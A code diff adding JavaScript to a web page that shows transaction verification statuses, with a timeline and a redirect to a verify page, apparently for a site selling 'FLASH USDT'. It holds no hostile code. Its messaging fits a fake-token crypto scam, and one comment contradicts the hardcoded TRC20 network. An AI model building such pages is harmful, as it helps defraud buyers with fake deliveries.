+        if (box) box.style.boxShadow = '0 0 25px rgba(0,240,255,.35)';
+        break;
+      case 'approved':
+        title.textContent = '✅ Approved';
+        sub.textContent   = 'Your transaction has been approved.';
+        title.classList.add('approvedGlow');
+        if (box) box.style.boxShadow = '0 0 25px rgba(22,209,138,.4)';
+        break;
+      case 'delivered':
+        title.textContent = '📦 Delivered';
+        sub.textContent   = 'FLASH USDT successfully delivered to your wallet.';
+        title.classList.add('deliveredGlow');
+        if (box) box.style.boxShadow = '0 0 25px rgba(22,209,138,.5)';
+        break;
+      case 'rejected':
+        title.textContent = '❌ Transaction Rejected';
+        sub.textContent   = 'Your TXID was invalid or rejected by the system.';
+        title.classList.add('rejectedGlow');
+        if (box) box.style.boxShadow = '0 0 25px rgba(255,75,159,.35)';
+        document.querySelector('.tx-summary')?.classList.add('shake');
+        break;
+      default:
+        title.textContent = '⏳ Transaction Verification Pending';
+        sub.textContent   = 'Your transaction is awaiting blockchain confirmation.';
+        title.classList.add('pendingGlow');
+        if (box) box.style.boxShadow = '0 0 25px rgba(255,204,77,.3)';
+    }
+
+    // 🔁 Timeline güncelle
+    const tl = [document.getElementById('tl1'), document.getElementById('tl2'), document.getElementById('tl3')];
+    tl.forEach(e => e.classList.remove('active','done','error'));
+
+    if (data.status === 'pending') tl[0].classList.add('active');
+    else if (data.status === 'processing') { tl[0].classList.add('done'); tl[1].classList.add('active'); }
+    else if (data.status === 'approved') { tl[0].classList.add('done'); tl[1].classList.add('done'); tl[2].classList.add('active'); }
+    else if (data.status === 'delivered') tl.forEach(e => e.classList.add('done'));
+    else if (data.status === 'rejected') tl[0].classList.add('error');
+
+  } catch (err) {
+    console.error('verify_status fetch error:', err);
+  }
+}
 
 
   // Init
   showStep('step1');
   updateSummary();
   showPayDetails(false); // ilk ekranda gizli
+
+document.getElementById('navTxid')?.addEventListener('click', (e) => {
+  e.preventDefault();
+  e.stopPropagation();
+
+  // Network bilgisi
+  const network = 'TRC20'; // bu dosya ERC20 olduğu için sabit
+  document.body.style.transition = 'opacity 0.4s ease';
+  document.body.style.opacity = '0';
+  setTimeout(() => window.location.href = `verify.html?network=${network}`, 400);
+});
+
 </script>
 </body>
 </html>
